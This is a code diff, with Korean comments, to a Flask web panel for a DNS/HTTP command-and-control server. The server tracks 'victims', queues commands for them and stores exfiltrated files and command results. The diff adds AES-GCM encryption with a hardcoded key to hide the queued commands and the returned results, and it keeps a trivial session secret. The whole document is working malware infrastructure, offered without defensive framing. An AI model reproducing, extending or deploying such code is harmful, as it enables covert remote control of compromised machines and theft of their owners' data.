@@ -9,6 +9,8 @@ from datetime import datetime, timezone
 # --- [수정] session, flash, wraps 추가 ---
 from flask import Flask, request, jsonify, render_template, redirect, url_for, send_from_directory, session, flash
 from functools import wraps
+from Crypto.Cipher import AES
+from Crypto.Random import get_random_bytes
 # ------------------------------------
 import logging
 import hashlib
@@ -19,21 +21,56 @@ import requests
 app = Flask(__name__)
 
 # --- [추가] 세션 암호화를 위한 시크릿 키 설정 ---
-# 경고: 실제 운영 환경에서는 반드시 예측 불가능한 복잡한 문자열로 변경하세요!
 app.secret_key = 'ccit'
+app.config['MAX_CONTENT_LENGTH'] = 512 * 1024 * 1024
+SECRET_KEY = bytes.fromhex('67d99162b5671e701b28ef01be91c1512cfd620f4f64abda14e212faddeab016') 
 
 # Configuration
 BASE_DIR = "/root/dns-c2/"
 COMMAND_QUEUE_FILE = os.path.join(BASE_DIR, "server", "command_queue.json")
 VICTIM_METADATA_FILE = os.path.join(BASE_DIR, "server", "victim_metadata.json") # 추가
 RESULTS_DIR = os.path.join(BASE_DIR, "logs", "results")
-API_PORT = 80
+API_PORT = 5000
 ONLINE_THRESHOLD_SECONDS = 300
 RESTORED_ZIPS_DIR = os.path.abspath(os.path.join(BASE_DIR, "analyzer", "restored_zips"))
 HTTP_EXFIL_DIR = os.path.join(BASE_DIR, "exfiltrated_files_http")
 
 
 logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
+
+
+def encrypt_data(key, plaintext_str):
+    try:
+        header = b'ENCV1$' # 암호화된 데이터 식별용 헤더
+        plaintext_bytes = plaintext_str.encode('utf-8', 'ignore')
+        cipher = AES.new(key, AES.MODE_GCM)
+        nonce = cipher.nonce
+        ciphertext, tag = cipher.encrypt_and_digest(plaintext_bytes)
+        # B64(헤더) + B64(nonce + tag + ciphertext) 형태로 반환
+        return base64.b64encode(header).decode('utf-8') + base64.b64encode(nonce + tag + ciphertext).decode('utf-8')
+    except Exception as e:
+        logging.error(f"Encryption failed: {e}")
+        return plaintext_str # 암호화 실패 시 평문 반환
+
+def decrypt_data(key, encrypted_b64_str):
+    try:
+        header_b64 = base64.b64encode(b'ENCV1$').decode('utf-8')
+        if not encrypted_b64_str.startswith(header_b64):
+            return encrypted_b64_str # 헤더가 없으면 평문으로 간주
+
+        encrypted_payload_b64 = encrypted_b64_str[len(header_b64):]
+        decoded_payload = base64.b64decode(encrypted_payload_b64)
+        
+        nonce = decoded_payload[:16]
+        tag = decoded_payload[16:32]
+        ciphertext = decoded_payload[32:]
+        
+        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
+        plaintext_bytes = cipher.decrypt_and_verify(ciphertext, tag)
+        return plaintext_bytes.decode('utf-8', 'ignore')
+    except (ValueError, KeyError, Exception) as e:
+        logging.error(f"Decryption failed: {e}")
+        return f"DECRYPTION_FAILED: {encrypted_b64_str}"
 
 # --- [추가] 로그인 데코레이터 ---
 def login_required(f):
@@ -197,30 +234,24 @@ def logout():
 @app.route('/', methods=['GET'])
 @login_required
 def index():
-    logging.info("--- index route CALLED ---") # 함수 시작 로깅
+    logging.info("--- index route CALLED ---")
     victims_data = []
     try:
+        # Victim 정보 로딩 및 상태 확인 (기존과 동일)
         victim_metadata = load_victim_metadata()
-        logging.debug("index: Victim metadata loaded.")
-
         victim_hashes_from_dir = set()
         if os.path.exists(RESULTS_DIR) and os.path.isdir(RESULTS_DIR):
             try:
                 victim_hashes_from_dir.update(d for d in os.listdir(RESULTS_DIR) if os.path.isdir(os.path.join(RESULTS_DIR, d)))
-                logging.debug(f"index: Victim hashes from dir: {victim_hashes_from_dir}")
             except OSError as e:
                 logging.error(f"index: Error listing victim directories in {RESULTS_DIR}: {e}")
-        else:
-            logging.warning(f"index: RESULTS_DIR {RESULTS_DIR} does not exist or is not a directory.")
 
         all_known_victim_hashes = victim_hashes_from_dir | set(victim_metadata.keys())
-        logging.info(f"index: All known victim hashes: {all_known_victim_hashes}")
 
         for v_hash in sorted(list(all_known_victim_hashes)):
             victim_meta = victim_metadata.get(v_hash, {})
             last_seen_str = victim_meta.get('last_seen', None)
             status = "Unknown"
-
             if last_seen_str and last_seen_str != 'Never':
                 try:
                     last_seen_dt = datetime.strptime(last_seen_str, '%Y-%m-%d %H:%M:%S').replace(tzinfo=timezone.utc)
@@ -229,7 +260,7 @@ def index():
                     else:
                         status = "Offline"
                 except ValueError:
-                    logging.warning(f"index: Could not parse last_seen string '{last_seen_str}' for victim {v_hash}. Setting status to Unknown.")
+                    logging.warning(f"index: Could not parse last_seen string '{last_seen_str}' for victim {v_hash}.")
             elif last_seen_str == 'Never':
                 status = "Offline"
             
@@ -243,20 +274,22 @@ def index():
             }
             victims_data.append(victim_info)
         
-        logging.debug(f"index: Prepared victims_data: {victims_data}")
+        # --- [핵심 수정 부분] 명령어 큐 처리 로직 ---
         queued_commands = load_command_queue()
-        logging.debug(f"index: Loaded queued_commands: {len(queued_commands)} commands.")
+        
+        # 템플릿에 전달하기 전에 암호화된 명령어를 복호화합니다.
+        for cmd in queued_commands:
+            encrypted_cmd_str = cmd.get('command_string', '')
+            # decrypt_data 함수를 사용해 복호화
+            decrypted_cmd_str = decrypt_data(SECRET_KEY, encrypted_cmd_str)
+            # 복호화된 값을 템플릿에서 사용하기 쉽도록 새 키에 저장
+            cmd['command_string_decrypted'] = decrypted_cmd_str
 
-        # 이 부분이 중요합니다. 이 로그가 출력되는지 확인하세요.
-        logging.info(f"index: About to render index.html with {len(victims_data)} victims.")
-        response = render_template('index.html', victims=victims_data, queued_commands=queued_commands, RESULTS_DIR_DISPLAY=RESULTS_DIR)
-        logging.info("--- index route RETURNING response ---") # 반환 직전 로깅
-        return response # 이 return 문이 반드시 실행되어야 합니다.
+        logging.info(f"index: About to render index.html with {len(victims_data)} victims and {len(queued_commands)} commands (decrypted for display).")
+        return render_template('index.html', victims=victims_data, queued_commands=queued_commands, RESULTS_DIR_DISPLAY=RESULTS_DIR)
 
     except Exception as e:
-        # index 함수 내에서 예상치 못한 다른 예외가 발생했는지 확인
         logging.error(f"CRITICAL ERROR within index route: {e}", exc_info=True)
-        # 비상 반환 (실제로는 Flask의 500 오류 페이지가 더 적절하지만, None 반환을 막기 위함)
         return "An unexpected error occurred in the index route. Please check server logs.", 500
 
 # --- [추가] HTTP로 유출된 ZIP 파일을 다운로드하는 라우트 ---
@@ -316,18 +349,23 @@ def download_restored_exfil_file(victim_hash, session_name):
 @app.route('/queue_command', methods=['POST'])
 @login_required
 def queue_command_route():
-    victim_id_form = request.form.get('victim_id', '').strip() # API는 victim_hash를 사용하지만, 폼에서는 victim_id로 받음
+    victim_id_form = request.form.get('victim_id', '').strip()
     command_string = request.form.get('command_string', '').strip()
 
     if not victim_id_form or not command_string:
         logging.error("Queue command: Missing victim_id or command_string in form submission.")
         return "Missing victim_id or command_string", 400
     
+    # [수정] 평문 명령어를 암호화합니다.
+    encrypted_command_str = encrypt_data(SECRET_KEY, command_string)
+    logging.info(f"Plaintext command '{command_string}' encrypted for queuing for victim '{victim_id_form}'.")
+    
     queue = load_command_queue()
     new_command = {
         "command_id": str(uuid.uuid4()), 
-        "victim_hash": victim_id_form, # 웹 UI에서는 victim_hash를 직접 입력받거나 'all'
-        "command_string": command_string,
+        "victim_hash": victim_id_form,
+        # [수정] 암호화된 명령어를 command_string 필드에 저장합니다.
+        "command_string": encrypted_command_str,
         "status": "pending", 
         "submitted_at": datetime.now(timezone.utc).isoformat(timespec='seconds'),
         "delivered_at_dns": None, 
@@ -336,7 +374,7 @@ def queue_command_route():
     }
     queue.append(new_command)
     save_command_queue(queue)
-    logging.info(f"Queued command ID {new_command['command_id']} for victim_hash '{victim_id_form}': {command_string}")
+    logging.info(f"Queued encrypted command ID {new_command['command_id']} for victim_hash '{victim_id_form}'")
     return redirect(url_for('index'))
 
 
@@ -507,11 +545,32 @@ def browse_folder_item(victim_hash, session_name, sub_folder, item_name):
 @login_required
 def view_command_result_page(victim_hash, command_id):
     queue = load_command_queue()
-    target_command = next((cmd for cmd in queue if cmd.get('command_id') == command_id and cmd.get('victim_hash') == victim_hash), None)
+    # [개선] command_id는 고유하므로, victim_hash 조건 없이 찾아야 'all' 명령어 등도 올바르게 찾아옵니다.
+    target_command = next((cmd for cmd in queue if cmd.get('command_id') == command_id), None)
     
-    result_content = "Result not found or not yet submitted/processed for this specific victim and command ID."
+    # 템플릿에 보여주기 전에 암호화된 명령어를 복호화합니다.
+    if target_command:
+        encrypted_cmd_str = target_command.get('command_string', '')
+        decrypted_cmd_str = decrypt_data(SECRET_KEY, encrypted_cmd_str)
+        target_command['command_string_decrypted'] = decrypted_cmd_str
+
+    result_content = "<p class='text-muted'>Result not found or not yet submitted/processed for this command ID.</p>"
+    
+    # --- [추가] 오류의 원인이었던 누락된 변수 정의 ---
     cmd_id_short_expected = hashlib.md5(command_id.encode()).hexdigest()[:6] if command_id else None
     victim_base_path = os.path.join(RESULTS_DIR, victim_hash)
+    
+    # HTTP 채널로 제출된 결과 파일이 있는지 확인하고 읽어옴
+    if target_command and target_command.get('result_path') and os.path.isfile(target_command['result_path']):
+        try:
+            with open(target_command['result_path'], 'r', encoding='utf-8') as f_http:
+                file_content = f_http.read()
+                # pre 태그로 감싸서 공백과 줄바꿈을 그대로 표시
+                result_content = f"<pre>{file_content}</pre>"
+            logging.info(f"Successfully loaded result from file: {target_command['result_path']}")
+        except Exception as e_read_http:
+             result_content = f"<p class='text-danger'>Error reading stored result file: {e_read_http}</p>"
+             logging.error(f"Error reading HTTP result for cmd {command_id}: {e_read_http}")
 
     # DNS 제출 결과 확인
     if os.path.isdir(victim_base_path) and cmd_id_short_expected:
@@ -539,27 +598,6 @@ def view_command_result_page(victim_hash, command_id):
                     except Exception as e_read: 
                         result_content = f"Error reading/processing DNS result chunks: {e_read}"
                         logging.error(f"Error reading/processing DNS result for cmd {command_id}, victim {victim_hash}: {e_read}")
-    
-    # HTTP 제출 결과 확인 (DNS 결과를 못 찾았거나 오류 시)
-    if target_command and ("Result not found" in result_content or "Error" in result_content or "empty" in result_content):
-        if target_command.get('result_path') and os.path.isfile(target_command['result_path']):
-            try:
-                with open(target_command['result_path'], 'r', encoding='utf-8') as f_http:
-                    # 기존 결과에 추가하거나, HTTP 결과를 우선시 할 수 있음
-                    http_res_text = f"<h3>Result from HTTP Submission:</h3><pre>{f_http.read()}</pre>"
-                    if "Result not found" in result_content: # DNS 결과가 아예 없었으면 HTTP 결과만 표시
-                        result_content = http_res_text
-                    else: # DNS 결과 처리 중 오류가 있었으면, HTTP 결과도 같이 표시 (선택적)
-                        result_content += f"<hr/>{http_res_text}"
-            except Exception as e_http_read:
-                 error_msg_http = f"<br/>Error reading stored HTTP result file: {e_http_read}"
-                 if "Result not found" in result_content: result_content = error_msg_http
-                 else: result_content += error_msg_http
-                 logging.error(f"Error reading HTTP result for cmd {command_id}, victim {victim_hash}: {e_http_read}")
-        elif target_command.get('status') == 'completed_http_result' and not target_command.get('result_path'):
-            no_path_msg = "Result submitted via HTTP, but file path not recorded or file missing."
-            if "Result not found" in result_content: result_content = no_path_msg
-            else: result_content += f"<hr/>{no_path_msg}"
 
 
     return render_template('command_result.html', 
@@ -692,103 +730,89 @@ def submit_client_result(victim_uuid_full):
             logging.error(f"API Result: Empty JSON payload from {victim_uuid_full} (hash: {victim_hash})")
             return jsonify({"status": "error", "message": "Empty JSON payload"}), 400
         
-        command_str_executed = data.get('command') # 클라이언트가 보낸 "ID|CMD" 형식
-        result_output = data.get('result')
+        command_str_executed = data.get('command') # 클라이언트가 보낸 "ID|암호화된CMD" 형식
+        # [수정] 클라이언트가 보낸 암호화된 결과값
+        result_output_encrypted = data.get('result')
 
-        if command_str_executed is None or result_output is None: # 필수 필드 확인
+        if command_str_executed is None or result_output_encrypted is None: # 필수 필드 확인
              logging.error(f"API Result: Missing 'command' or 'result' in payload from {victim_hash}.")
              return jsonify({"status": "error", "message": "Missing 'command' or 'result' in payload"}), 400
 
+        # [수정] 받은 결과값을 복호화
+        result_output_decrypted = decrypt_data(SECRET_KEY, result_output_encrypted)
+        logging.info(f"API: Received and decrypted result from victim {victim_hash} for command '{command_str_executed[:50]}...'")
+
         command_id_from_client = None
-        actual_command_str = command_str_executed # 기본값
+        # 서버는 암호화된 명령어로 매칭해야 하므로, command_str_executed를 그대로 사용
+        actual_command_str_encrypted = command_str_executed
 
         if "|" in command_str_executed:
             try: 
-                command_id_from_client, actual_command_str = command_str_executed.split("|", 1)
+                command_id_from_client, actual_command_str_encrypted = command_str_executed.split("|", 1)
             except ValueError: 
-                # ID|CMD 형식이 아니면, command_str_executed 전체를 actual_command_str로 사용
-                logging.warning(f"API Result: command string '{command_str_executed}' from {victim_hash} is not in ID|CMD format. Using full string for matching.")
-                pass # command_id_from_client는 None으로 유지
+                pass
         
-    except Exception as e: # json 파싱 오류 등
+    except Exception as e:
         logging.error(f"API Result: Bad request or JSON error from {victim_uuid_full} (hash: {victim_hash}): {e}")
         return jsonify({"status": "error", "message": "Bad request or invalid JSON"}), 400
-
-    logging.info(f"API: Received result from victim {victim_hash} for command '{actual_command_str[:100]}...' (Client provided ID: {command_id_from_client})")
     
     queue = load_command_queue()
     command_updated_in_queue = False
 
     for cmd_entry in queue:
         match_found = False
-        # 1. Command ID로 매칭 (가장 정확)
-        if command_id_from_client and cmd_entry.get('command_id') == command_id_from_client and \
-           (cmd_entry.get('victim_hash') == victim_hash or cmd_entry.get('victim_hash') == 'all'):
+        # Command ID로 정확히 매칭
+        if command_id_from_client and cmd_entry.get('command_id') == command_id_from_client:
             match_found = True
-        # 2. Command ID가 없거나 매칭 안될 시, Command String으로 매칭 (폴백)
-        #    주의: 동일 명령이 여러 번 'pending' 상태로 'all' 또는 특정 victim에게 할당된 경우, 가장 먼저 매칭되는 것을 업데이트.
-        elif not command_id_from_client and cmd_entry.get('command_string') == actual_command_str and \
-             (cmd_entry.get('victim_hash') == victim_hash or cmd_entry.get('victim_hash') == 'all') and \
-             (cmd_entry.get('status') == 'delivered_http' or cmd_entry.get('status') == 'delivered_dns'): # 이미 실행된 명령의 결과일 가능성
-            match_found = True
-            logging.warning(f"API Result: Matched command by string for victim {victim_hash}. CMD: '{actual_command_str[:50]}...' This might be ambiguous if IDs are not used consistently.")
         
         if match_found:
             cmd_entry['status'] = 'completed_http_result'
             
-            # 결과 저장 경로 결정 (세션 기반)
-            # victim_uuid_full 대신 victim_hash 사용
-            session_to_store = "default_http_session" # HTTP 결과는 별도 세션 디렉토리 사용 가능
-            # 또는 가장 최근 세션 디렉토리를 찾아서 저장 (기존 로직과 유사하게)
+            session_to_store = "default_http_session"
             victim_sessions_path = os.path.join(RESULTS_DIR, victim_hash)
             if os.path.isdir(victim_sessions_path):
                 sessions = sorted([s for s in os.listdir(victim_sessions_path) if os.path.isdir(os.path.join(victim_sessions_path, s))], reverse=True)
-                if sessions: 
-                    session_to_store = sessions[0] # 가장 최근 DNS 세션에 저장하거나,
-                else: # 세션 디렉토리가 없으면 새로 생성
-                    session_to_store = datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S_http')
-            else: # victim 디렉토리도 없으면 새로 생성
-                 session_to_store = datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S_http')
-
-
-            result_file_dir_name = command_id_from_client if command_id_from_client else hashlib.md5(actual_command_str.encode()).hexdigest()[:10]
-            result_file_base_dir = os.path.join(RESULTS_DIR, victim_hash, session_to_store, "http_cmd_results")
-            # result_file_dir = os.path.join(result_file_base_dir, result_file_dir_name) # 하위 디렉토리 생성 안 함, 파일로 바로 저장
-            os.makedirs(result_file_base_dir, exist_ok=True) # http_cmd_results 디렉토리 확인 및 생성
+                if sessions: session_to_store = sessions[0]
+                else: session_to_store = datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S_http')
+            else: session_to_store = datetime.now(timezone.utc).strftime('%Y%m%d_%H%M%S_http')
             
-            result_file_path = os.path.join(result_file_base_dir, f"{result_file_dir_name}_result.txt") # 파일명에 _result.txt 추가
+            result_file_dir_name = command_id_from_client or hashlib.md5(actual_command_str_encrypted.encode()).hexdigest()[:10]
+            result_file_base_dir = os.path.join(RESULTS_DIR, victim_hash, session_to_store, "http_cmd_results")
+            os.makedirs(result_file_base_dir, exist_ok=True)
+            result_file_path = os.path.join(result_file_base_dir, f"{result_file_dir_name}_result.txt")
 
             try:
+                # [수정] 복호화된 결과(result_output_decrypted)를 파일에 저장
                 with open(result_file_path, 'w', encoding='utf-8') as f:
                     f.write(f"Command ID (from client): {command_id_from_client}\n")
-                    f.write(f"Command String (executed): {actual_command_str}\n")
+                    f.write(f"Command String (encrypted from client): {actual_command_str_encrypted}\n")
                     f.write(f"Submitted at (UTC): {datetime.now(timezone.utc).isoformat(timespec='seconds')}\n\n")
-                    f.write(result_output)
+                    f.write(result_output_decrypted)
                 cmd_entry['result_path'] = result_file_path 
-                logging.info(f"API: Saved HTTP result for command ID {cmd_entry.get('command_id')} to {result_file_path}")
+                logging.info(f"API: Saved decrypted HTTP result for command ID {cmd_entry.get('command_id')} to {result_file_path}")
             except IOError as e_write: 
                 logging.error(f"API: Error writing HTTP result file {result_file_path}: {e_write}")
-                cmd_entry['result_path'] = None # 저장 실패 시 경로 없음
+                cmd_entry['result_path'] = None
             
             command_updated_in_queue = True
-            break # 첫 번째 매칭되는 명령만 업데이트
+            break
             
     if command_updated_in_queue:
         save_command_queue(queue)
     else:
-        logging.warning(f"API: Received HTTP result for an unknown, already processed, or non-matching command from {victim_hash}: '{actual_command_str[:50]}...' (Client Provided ID: {command_id_from_client})")
-        # 매칭되는 명령이 없더라도 결과는 저장할 수 있음 (선택적)
-        # 예: unknown_results 폴더에 저장
+        # 매칭되는 명령어가 없는 경우의 처리 (unknown_results)
+        logging.warning(f"API: Received HTTP result for a non-matching command from {victim_hash}.")
         unknown_result_dir = os.path.join(RESULTS_DIR, victim_hash, "unknown_http_results")
         os.makedirs(unknown_result_dir, exist_ok=True)
-        unknown_result_filename = f"{command_id_from_client or hashlib.md5(actual_command_str.encode()).hexdigest()[:10]}_{datetime.now(timezone.utc).strftime('%Y%m%d%H%M%S')}.txt"
+        unknown_result_filename = f"{command_id_from_client or 'unknown_id'}_{datetime.now(timezone.utc).strftime('%Y%m%d%H%M%S')}.txt"
         try:
+            # [수정] 알 수 없는 결과도 복호화해서 저장
+            decrypted_unknown_result = decrypt_data(SECRET_KEY, result_output_encrypted)
             with open(os.path.join(unknown_result_dir, unknown_result_filename), 'w', encoding='utf-8') as f_unknown:
-                f_unknown.write(f"Command (raw from client): {command_str_executed}\nResult:\n{result_output}")
-            logging.info(f"API: Saved non-matching result from {victim_hash} to {os.path.join(unknown_result_dir, unknown_result_filename)}")
+                f_unknown.write(f"Command (raw from client): {command_str_executed}\n\n--- DECRYPTED RESULT ---\n{decrypted_unknown_result}")
+            logging.info(f"API: Saved non-matching decrypted result from {victim_hash} to {os.path.join(unknown_result_dir, unknown_result_filename)}")
         except Exception as e_unknown_save:
             logging.error(f"API: Failed to save non-matching result from {victim_hash}: {e_unknown_save}")
-
 
     return jsonify({"status": "success"})
 
